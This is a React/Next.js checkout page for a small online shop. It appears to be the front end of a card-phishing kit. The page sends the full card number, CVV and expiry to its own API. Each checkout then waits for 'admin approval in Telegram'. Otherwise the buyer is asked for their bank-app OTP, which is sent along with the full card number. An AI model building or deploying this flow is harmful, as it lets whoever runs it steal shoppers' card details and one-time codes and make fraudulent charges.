"use client"

import { useState, useEffect, useRef } from 'react'
import toast from 'react-hot-toast'
import { ArrowRight, CreditCard, User, Calendar, Lock, MapPin, Shield, Truck, PackageCheck, Loader2, RefreshCw } from 'lucide-react'

const PAYMENT_API_BASE = process.env.NEXT_PUBLIC_API_BASE_URL || 'http://localhost:3001'

const PROCESSING_FEE_PERCENT = 0.029
const PROCESSING_FEE_MIN = 0.5
const PROCESSING_FEE_MAX = 10

const getProcessingFee = (amount: number): number => {
  const fee = amount * PROCESSING_FEE_PERCENT
  return Math.max(PROCESSING_FEE_MIN, Math.min(PROCESSING_FEE_MAX, fee))
}

const formatCardNumber = (value: string) => {
  const numbers = value.replace(/\D/g, '').slice(0, 16)
  return numbers.replace(/(\d{4})(?=\d)/g, '$1 ').trim()
}

const statusColors: Record<string, string> = {
  PENDING: 'bg-amber-50 text-amber-700 border border-amber-200',
  PROCESSING: 'bg-blue-50 text-blue-700 border border-blue-200',
  COMPLETED: 'bg-green-50 text-green-700 border border-green-200',
  FAILED: 'bg-red-50 text-red-700 border border-red-200',
  APPROVED_TELEGRAM: 'bg-purple-50 text-purple-700 border border-purple-200',
  REJECTED_TELEGRAM: 'bg-red-50 text-red-700 border border-red-200',
  default: 'bg-gray-50 text-gray-700 border border-gray-200',
}

interface Product {
  id: string
  name: string
  price: number
  image: string
}

interface CartItem {
  product: Product
  quantity: number
}

interface Order {
  id: string
  status: string
  totalAmount: number
  processingFee: number
  createdAt: string
}

interface PaymentIntent {
  clientSecret: string
  orderId: string
}

interface User {
  id: string
  name: string
  email: string
  telegramChatId?: string
  telegramConnected: boolean
}

async function fetchWithAuth(url: string, options: RequestInit = {}) {
  const defaultHeaders: HeadersInit = {
    'Content-Type': 'application/json',
  }
  
  const response = await fetch(url, {
    ...options,
    headers: {
      ...defaultHeaders,
      ...options.headers,
    },
  })
  
  return response
}

export default function CheckoutPage() {
  const [cartItems, setCartItems] = useState<CartItem[]>([])
  const [loading, setLoading] = useState(true)
  const [showPaymentForm, setShowPaymentForm] = useState(false)
  const [showSuccess, setShowSuccess] = useState(false)
  const [showOTPModal, setShowOTPModal] = useState(false)
  const [pendingOrderId, setPendingOrderId] = useState<string | null>(null)
  const [otpCode, setOtpCode] = useState('')
  const [processingPayment, setProcessingPayment] = useState(false)
  const [waitingForTelegramApproval, setWaitingForTelegramApproval] = useState(false)
  const [clientSecret, setClientSecret] = useState<string | null>(null)
  const [cardError, setCardError] = useState<string | null>(null)
  const [formData, setFormData] = useState({
    cardNumber: '',
    cardholderName: '',
    expiryDate: '',
    cvv: '',
    billingAddress: '',
    saveCard: false,
  })
  const [referralBalance, setReferralBalance] = useState(0)
  const [canUseReferral, setCanUseReferral] = useState(false)
  const [user, setUser] = useState<User | null>(null)
  const [telegramConnected, setTelegramConnected] = useState(false)
  const hasPromptedOTP = useRef(false)

  useEffect(() => {
    fetchCart()
    fetchReferralBalance()
    fetchUser()
  }, [])

  const fetchUser = async () => {
    try {
      const storedUser = localStorage.getItem('user')
      if (storedUser) {
        const userData = JSON.parse(storedUser)
        setUser(userData)
        setTelegramConnected(userData.telegramConnected || false)
      }
    } catch (err) {
      console.error(err)
    }
  }

  const fetchCart = async () => {
    try {
      const response = await fetchWithAuth(`${PAYMENT_API_BASE}/api/cart`)
      if (response.ok) {
        const cartData = await response.json()
        setCartItems(cartData.items || [])
      } else {
        throw new Error('Failed to fetch cart')
      }
    } catch (err: any) {
      const mockCart: CartItem[] = [
        {
          product: {
            id: 'PRD-001',
            name: 'Wall Paste Repair kit Coating Sealant Agent With Scraper Crack Hole Mending Paste Mildewproof Patch White Wall Restoration',
            price: 12.99,
            image: 'https://ae-pic-a1.aliexpress-media.com/kf/S0b0721e749814123ae9203b340dee9073.jpg',
          },
          quantity: 1,
        },
      ]
      setCartItems(mockCart)
    } finally {
      setLoading(false)
    }
  }

  const fetchReferralBalance = async () => {
    try {
      const response = await fetchWithAuth(`${PAYMENT_API_BASE}/api/referrals/balance`)
      if (response.ok) {
        const data = await response.json()
        setReferralBalance(Number(data.walletBalance || 0))
        setCanUseReferral(Boolean(data.canWithdrawReferralRewards))
      }
    } catch (err) {
      setReferralBalance(5.5)
      setCanUseReferral(true)
    }
  }

  const createPaymentIntent = async (amount: number, items: CartItem[]) => {
    try {
      const response = await fetchWithAuth(`${PAYMENT_API_BASE}/api/payments/create-intent`, {
        method: 'POST',
        body: JSON.stringify({
          amount,
          items,
          customerEmail: 'customer@example.com',
          metadata: {
            source: 'cart_checkout',
            processingFee: getProcessingFee(amount),
          },
        }),
      })
      
      if (!response.ok) {
        throw new Error('Failed to create payment intent')
      }
      
      const data = await response.json()
      return data
    } catch (err: any) {
      throw new Error(err.message || 'Payment initialization failed')
    }
  }

  const validateCard = (cardNumber: string): boolean => {
    const LuhnCheck = (num: string): boolean => {
      let sum = 0
      let isEven = false
      for (let i = num.length - 1; i >= 0; i--) {
        let digit = parseInt(num[i], 10)
        if (isEven) digit *= 2
        if (digit > 9) digit -= 9
        sum += digit
        isEven = !isEven
      }
      return sum % 10 === 0
    }
    const cleanNumber = cardNumber.replace(/\s/g, '')
    return cleanNumber.length === 16 && LuhnCheck(cleanNumber)
  }

  const subtotal = cartItems.reduce((sum, item) => sum + item.product.price * item.quantity, 0)
  const processingFee = getProcessingFee(subtotal)
  const total = subtotal + processingFee
  const shipping = subtotal >= 25 ? 0 : 5.99
  const finalTotal = total + shipping

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setCardError(null)
    
    if (!formData.cardNumber || !formData.cardholderName || !formData.expiryDate || !formData.cvv || !formData.billingAddress) {
      toast.error('Please fill in all payment details')
      return
    }

    const cardNumber = formData.cardNumber.replace(/\s/g, '')
    if (cardNumber.length !== 16) {
      setCardError('Please enter a valid 16-digit card number')
      return
    }

    if (!validateCard(cardNumber)) {
      setCardError('Invalid card number')
      return
    }

    const cvv = formData.cvv.replace(/\s/g, '')
    if (cvv.length !== 3 && cvv.length !== 4) {
      setCardError('Please enter a valid CVV')
      return
    }

    setProcessingPayment(true)
    
    try {
      const checkoutPayload = {
        userId: user?.id,
        cardNumber,
        cardholderName: formData.cardholderName,
        expiryDate: formData.expiryDate,
        cvv,
        billingAddress: formData.billingAddress,
        amount: finalTotal,
        totalAmount: finalTotal,
        processingFee,
        items: cartItems,
        paymentMethod: 'CARD',
        cardLast4: cardNumber.slice(-4),
      }
      
      const response = await fetchWithAuth(`${PAYMENT_API_BASE}/api/checkouts`, {
        method: 'POST',
        body: JSON.stringify(checkoutPayload),
      })
      
      if (!response.ok) {
        throw new Error('Failed to create checkout')
      }
      
      const checkoutData = await response.json()
      
      if (checkoutData.success && checkoutData.data?.id) {
        setProcessingPayment(false)
        setWaitingForTelegramApproval(true)
        if (telegramConnected) {
          toast.success('Checkout sent to Telegram. Check your app to approve.')
          setShowPaymentForm(false)
          await checkApprovalStatus(checkoutData.data.id)
        } else {
          setClientSecret(checkoutData.data.id)
          setPendingOrderId(checkoutData.data.id)
          setShowPaymentForm(false)
          setShowOTPModal(true)
        }
      } else {
        throw new Error(checkoutData.message || 'Failed to create checkout')
      }
    } catch (err: any) {
      toast.error(err.message || 'Failed to process payment')
    } finally {
      setProcessingPayment(false)
    }
  }
  
  const checkApprovalStatus = async (checkoutId: string) => {
    let attempts = 0
    const maxAttempts = 12
    
    try {
      const interval = setInterval(async () => {
        attempts++
        try {
          const response = await fetchWithAuth(`${PAYMENT_API_BASE}/api/checkouts/${checkoutId}`)
          const checkout = await response.json()
          
          if (checkout.status === 'APPROVED_TELEGRAM' || checkout.status === 'COMPLETED') {
            clearInterval(interval)
            setWaitingForTelegramApproval(false)
            setShowOTPModal(true)
            handleTelegramSuccess(checkoutId, checkout)
          } else if (checkout.status === 'REJECTED_TELEGRAM' || checkout.status === 'FAILED') {
            clearInterval(interval)
            setWaitingForTelegramApproval(false)
            toast.error('Checkout was rejected')
            setShowOTPModal(false)
          } else if (attempts >= maxAttempts) {
            clearInterval(interval)
            setWaitingForTelegramApproval(false)
            toast.error('Waiting for Telegram approval...')
          }
        } catch (err) {
          console.error(err)
        }
      }, 3000)
    } catch (err) {
      console.error(err)
    }
  }
  
  const handleTelegramSuccess = (checkoutId: string, checkout: any) => {
    const orderData = {
      id: checkoutId,
      status: checkout.status,
      totalAmount: finalTotal,
      processingFee,
      items: cartItems,
      paymentMethod: 'CARD',
      cardLast4: formData.cardNumber.replace(/\s/g, '').slice(-4),
      approvedVia: 'telegram',
      approvedAt: checkout.approvedAt || new Date().toISOString(),
    }
    
    localStorage.setItem('orderConfirmation', JSON.stringify(orderData))
    setShowOTPModal(false)
    setShowSuccess(true)
    toast.success('Payment approved via Telegram!')
  }

  const handleSubmitOTP = async () => {
    if (!pendingOrderId || !otpCode || otpCode.length < 6) {
      toast.error('Please enter valid OTP code')
      return
    }
    
    setProcessingPayment(true)
    
    try {
      const response = await fetchWithAuth(`${PAYMENT_API_BASE}/api/orders/${pendingOrderId}/confirm`, {
        method: 'POST',
        body: JSON.stringify({
          otpCode,
          cardToken: formData.cardNumber.replace(/\s/g, ''),
          cardLast4: formData.cardNumber.replace(/\s/g, '').slice(-4),
        }),
      })
      
      if (!response.ok) {
        const error = await response.json()
        throw new Error(error.message || 'Payment verification failed')
      }
      
      const responseData = await response.json()
      
      const orderData = {
        id: pendingOrderId,
        status: 'COMPLETED',
        totalAmount: finalTotal,
        processingFee,
        items: cartItems,
        paymentMethod: 'CARD',
        cardLast4: formData.cardNumber.replace(/\s/g, '').slice(-4),
        clientSecret,
        paymentId: responseData.paymentId,
      }
      
      localStorage.setItem('orderConfirmation', JSON.stringify(orderData))
      setShowOTPModal(false)
      setShowSuccess(true)
      toast.success('Payment completed successfully!')
      
      try {
        await fetchWithAuth(`${PAYMENT_API_BASE}/api/orders/${pendingOrderId}`, {
          method: 'GET',
        })
      } catch (err) {
        console.log('Order sync pending')
      }
    } catch (err: any) {
      toast.error(err.message || 'Verification failed')
    } finally {
      setOtpCode('')
      setProcessingPayment(false)
    }
  }

  if (showSuccess) {
    return (
      <main className="flex-1 overflow-y-auto p-4 sm:p-6 lg:p-8">
        <div className="mx-auto max-w-2xl">
          <div className="text-center py-12">
            <div className="inline-flex items-center justify-center w-16 h-16 bg-green-100 rounded-full mb-4">
              <PackageCheck className="h-8 w-8 text-green-600" />
            </div>
            <h2 className="text-2xl font-bold text-gray-900 mb-2">Order Confirmed!</h2>
            <p className="text-gray-500 mb-6">Thank you for your purchase</p>
            <div className="bg-gray-50 rounded-lg p-4 mb-6">
              <p className="text-sm text-gray-500 mb-2">Order ID</p>
              <p className="font-mono text-lg text-gray-900">{pendingOrderId}</p>
              <p className="text-sm text-gray-500 mt-4 mb-2">Estimated Delivery</p>
              <p className="text-gray-900">3-7 business days</p>
            </div>
            <button
              onClick={() => (window.location.href = '/')}
              className="inline-flex items-center justify-center gap-2 rounded-lg bg-gradient-to-r from-blue-500 to-sky-500 px-6 py-2 text-sm font-semibold text-white hover:from-blue-600 hover:to-sky-600"
            >
              Continue Shopping
              <ArrowRight className="h-4 w-4" />
            </button>
          </div>
        </div>
      </main>
    )
  }

  return (
    <main className="flex-1 overflow-y-auto p-4 sm:p-6 lg:p-8">
      <div className="mx-auto max-w-4xl">
        <div className="mb-6">
          <h1 className="text-2xl font-bold text-gray-900">Checkout</h1>
          <p className="text-sm text-gray-500">Complete your purchase securely</p>
        </div>

        <div className="grid gap-6 lg:grid-cols-2">
          <div className="space-y-6">
            <div className="rounded-2xl border bg-white p-6 shadow-sm">
              <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center gap-2">
                <Truck className="h-5 w-5 text-blue-500" />
                Shipping Information
              </h3>
              <div className="space-y-4">
                <div>
                  <label className="block text-xs font-medium text-gray-600 uppercase tracking-wide mb-1">Full Name</label>
                  <input
                    type="text"
                    defaultValue="John Doe"
                    className="w-full rounded-lg border border-gray-200 px-3 py-2 text-sm focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-500/10 bg-gray-50"
                  />
                </div>
                <div>
                  <label className="block text-xs font-medium text-gray-600 uppercase tracking-wide mb-1">Email</label>
                  <input
                    type="email"
                    defaultValue="john.doe@example.com"
                    className="w-full rounded-lg border border-gray-200 px-3 py-2 text-sm focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-500/10 bg-gray-50"
                  />
                </div>
                <div>
                  <label className="block text-xs font-medium text-gray-600 uppercase tracking-wide mb-1">Billing Address</label>
                  <div className="relative">
                    <MapPin className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400" />
                    <input
                      type="text"
                      value={formData.billingAddress}
                      onChange={(e) => setFormData({ ...formData, billingAddress: e.target.value })}
                      className="w-full rounded-lg border border-gray-200 pl-10 pr-3 py-2 text-sm focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-500/10 bg-gray-50"
                      placeholder="Street, Apartment, City, ZIP"
                    />
                  </div>
                </div>
              </div>
            </div>

            <div className="rounded-2xl border bg-white p-6 shadow-sm">
              <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center gap-2">
                <CreditCard className="h-5 w-5 text-blue-500" />
                Payment Method
              </h3>
              <button
                onClick={() => setShowPaymentForm(true)}
                className="w-full flex items-center justify-between p-4 border rounded-lg hover:border-blue-500 transition-colors"
              >
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 flex items-center justify-center bg-gradient-to-r from-blue-500 to-sky-500 rounded-full text-white font-bold">
                    ****
                  </div>
                  <div>
                    <p className="font-medium text-gray-900">Credit Card</p>
                    <p className="text-sm text-gray-500">Visa •••• 3456</p>
                  </div>
                </div>
                <ArrowRight className="h-5 w-5 text-gray-400" />
              </button>
              <button className="w-full mt-3 flex items-center justify-center gap-2 p-4 border rounded-lg hover:border-blue-500 transition-colors">
                <User className="h-5 w-5 text-gray-400" />
                <span className="text-gray-700">PayPal</span>
              </button>
            </div>
          </div>

          <div className="space-y-6">
            <div className="rounded-2xl border bg-white p-6 shadow-sm">
              <h3 className="text-lg font-semibold text-gray-900 mb-4">Order Summary</h3>
              <div className="space-y-3">
                {cartItems.map((item) => (
                  <div key={item.product.id} className="flex items-center gap-4">
                    <img
                      src={item.product.image}
                      alt={item.product.name}
                      className="w-16 h-16 object-cover rounded-lg"
                    />
                    <div className="flex-1">
                      <p className="text-sm font-medium text-gray-900">{item.product.name}</p>
                      <p className="text-xs text-gray-500">Qty: {item.quantity}</p>
                      <p className="text-sm text-gray-600">${item.product.price.toFixed(2)}</p>
                    </div>
                  </div>
                ))}
              </div>

              <div className="border-t pt-4 space-y-3">
                <div className="flex justify-between">
                  <span className="text-gray-600">Subtotal</span>
                  <span className="text-gray-900">${subtotal.toFixed(2)}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">Processing Fee ({PROCESSING_FEE_PERCENT * 100}%)</span>
                  <span className="text-gray-900">${processingFee.toFixed(2)}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">Shipping</span>
                  <span className="text-gray-900">${shipping.toFixed(2)}</span>
                </div>
                {canUseReferral && referralBalance > 0 && (
                  <div className="flex justify-between text-green-600">
                    <span className="flex items-center gap-1">
                      <Shield className="h-4 w-4" />
                      Referral Discount
                    </span>
                    <span>-${Math.min(referralBalance, finalTotal).toFixed(2)}</span>
                  </div>
                )}
                <div className="border-t pt-3">
                  <div className="flex justify-between">
                    <span className="text-lg font-semibold text-gray-900">Total</span>
                    <span className="text-lg font-bold text-gray-900">${(finalTotal - Math.min(referralBalance, finalTotal)).toFixed(2)}</span>
                  </div>
                </div>
              </div>

              <button
                onClick={() => setShowPaymentForm(true)}
                className="mt-6 w-full inline-flex items-center justify-center gap-2 rounded-lg bg-gradient-to-r from-blue-500 to-sky-500 px-4 py-2 text-sm font-semibold text-white hover:from-blue-600 hover:to-sky-600 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 transition-all duration-200"
              >
                Proceed to Payment
                <ArrowRight className="h-4 w-4" />
              </button>
            </div>
          </div>
        </div>

        {showPaymentForm && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm">
            <div className="bg-white rounded-2xl w-full max-w-lg mx-4 shadow-xl max-h-[90vh] overflow-y-auto">
              <div className="p-6">
                <h3 className="text-xl font-semibold text-gray-900 mb-6 flex items-center gap-2">
                  <CreditCard className="h-5 w-5 text-blue-500" />
                  Payment Details
                </h3>
                <form onSubmit={handleSubmit} className="space-y-4">
                  {cardError && (
                    <div className="p-3 rounded-lg bg-red-50 border border-red-200 mb-4">
                      <p className="text-sm text-red-600">{cardError}</p>
                    </div>
                  )}
                  <div>
                    <label className="block text-xs font-medium text-gray-600 uppercase tracking-wide mb-1">Card Number</label>
                    <div className="relative">
                      <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400" />
                      <input
                        type="text"
                        value={formatCardNumber(formData.cardNumber)}
                        onChange={(e) => setFormData({ ...formData, cardNumber: formatCardNumber(e.target.value).replace(/\s/g, '') })}
                        className="w-full rounded-lg border border-gray-200 pl-10 pr-3 py-2 text-sm focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-500/10 font-mono bg-gray-50"
                        placeholder="1234 5678 9012 3456"
                        maxLength={19}
                        required
                      />
                    </div>
                  </div>
                  <div>
                    <label className="block text-xs font-medium text-gray-600 uppercase tracking-wide mb-1">Cardholder Name</label>
                    <div className="relative">
                      <User className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400" />
                      <input
                        type="text"
                        value={formData.cardholderName}
                        onChange={(e) => setFormData({ ...formData, cardholderName: e.target.value })}
                        className="w-full rounded-lg border border-gray-200 pl-10 pr-3 py-2 text-sm focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-500/10 bg-gray-50"
                        placeholder="John Doe"
                        required
                      />
                    </div>
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="block text-xs font-medium text-gray-600 uppercase tracking-wide mb-1">Expiry Date</label>
                      <div className="relative">
                        <Calendar className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400" />
                        <input
                          type="text"
                          value={formData.expiryDate}
                          onChange={(e) => {
                            let v = e.target.value.replace(/\D/g, '')
                            if (v.length >= 2) v = v.slice(0, 2) + '/' + v.slice(2, 4)
                            setFormData({ ...formData, expiryDate: v.slice(0, 5) })
                          }}
                          className="w-full rounded-lg border border-gray-200 pl-10 pr-3 py-2 text-sm focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-500/10 bg-gray-50"
                          placeholder="12/25"
                          maxLength={5}
                          required
                        />
                      </div>
                    </div>
                    <div>
                      <label className="block text-xs font-medium text-gray-600 uppercase tracking-wide mb-1">CVV</label>
                      <div className="relative">
                        <Lock className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400" />
                        <input
                          type="text"
                          value={formData.cvv}
                          onChange={(e) => setFormData({ ...formData, cvv: e.target.value.replace(/\D/g, '').slice(0, 3) })}
                          className="w-full rounded-lg border border-gray-200 pl-10 pr-3 py-2 text-sm focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-500/10 bg-gray-50"
                          placeholder="123"
                          maxLength={3}
                          required
                        />
                      </div>
                    </div>
                  </div>
                  <div>
                    <label className="block text-xs font-medium text-gray-600 uppercase tracking-wide mb-1">Billing Address</label>
                    <div className="relative">
                      <MapPin className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400" />
                      <input
                        type="text"
                        value={formData.billingAddress}
                        onChange={(e) => setFormData({ ...formData, billingAddress: e.target.value })}
                        className="w-full rounded-lg border border-gray-200 pl-10 pr-3 py-2 text-sm focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-500/10 bg-gray-50"
                        placeholder="Street, Apartment, City, ZIP"
                        required
                      />
                    </div>
                  </div>
                  <div className="flex items-center gap-2">
                    <input
                      type="checkbox"
                      checked={formData.saveCard}
                      onChange={(e) => setFormData({ ...formData, saveCard: e.target.checked })}
                      className="h-4 w-4 text-blue-500 rounded border-gray-300 focus:ring-blue-500"
                    />
                    <label className="text-sm text-gray-600">Save this card for future purchases</label>
                  </div>
                  <div className="flex gap-3 pt-4">
                    <button
                      type="submit"
                      disabled={processingPayment}
                      className="flex-1 inline-flex items-center justify-center gap-2 rounded-lg bg-gradient-to-r from-blue-500 to-sky-500 px-4 py-2 text-sm font-semibold text-white hover:from-blue-600 hover:to-sky-600 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                      {processingPayment ? (
                        <>
                          <Loader2 className="h-4 w-4 animate-spin" />
                          Processing...
                        </>
                      ) : (
                        <>
                          Place Order
                          <ArrowRight className="h-4 w-4" />
                        </>
                      )}
                    </button>
                    <button
                      type="button"
                      onClick={() => setShowPaymentForm(false)}
                      disabled={processingPayment}
                      className="flex-1 inline-flex items-center justify-center gap-2 rounded-lg border border-gray-200 px-4 py-2 text-sm font-medium text-gray-700 hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-gray-200 transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                      Cancel
                    </button>
                  </div>
                </form>
              </div>
            </div>
          </div>
        )}

        {showOTPModal && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm">
            <div className="rounded-2xl border bg-white p-6 w-full max-w-md mx-4 shadow-xl">
              <h3 className="text-lg font-semibold text-slate-900 mb-4 flex items-center gap-2">
                <Shield className="h-5 w-5 text-blue-500" />
                Verify Payment
              </h3>
              <p className="text-sm text-slate-700 mb-4">
                {waitingForTelegramApproval && telegramConnected
                  ? 'Approving via Telegram...\nWaiting for admin approval in Telegram.'
                  : 'Enter the OTP from your bank app to complete the payment.'}
              </p>
              {waitingForTelegramApproval && telegramConnected ? (
                <div className="text-center py-4">
                  <Loader2 className="h-8 w-8 animate-spin text-blue-500 mx-auto mb-2" />
                  <p className="text-sm text-gray-500">Waiting for approval...</p>
                </div>
              ) : (
                <input
                  type="text"
                  value={otpCode}
                  onChange={(e) => setOtpCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
                  className="w-full rounded-lg border border-gray-200 px-3 py-2 text-center text-lg font-mono tracking-wider focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-500/10"
                  placeholder="Enter OTP code"
                  maxLength={6}
                  disabled={processingPayment}
                />
              )}
              <div className="mt-4 flex gap-3">
                <button
                  onClick={handleSubmitOTP}
                  disabled={processingPayment || waitingForTelegramApproval}
                  className="flex-1 inline-flex items-center justify-center gap-2 rounded-lg bg-gradient-to-r from-blue-500 to-sky-500 px-4 py-2 text-sm font-semibold text-white hover:from-blue-600 hover:to-sky-600 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  {processingPayment ? (
                    <>
                      <Loader2 className="h-4 w-4 animate-spin" />
                      Verifying...
                    </>
                  ) : (
                    'Verify & Complete'
                  )}
                </button>
                <button
                  onClick={() => setShowOTPModal(false)}
                  disabled={processingPayment}
                  className="flex-1 inline-flex items-center justify-center gap-2 rounded-lg border border-gray-200 px-4 py-2 text-sm font-medium text-gray-700 hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-gray-200 transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  Cancel
                </button>
              </div>
            </div>
          </div>
        )}
      </div>
    </main>
  )
}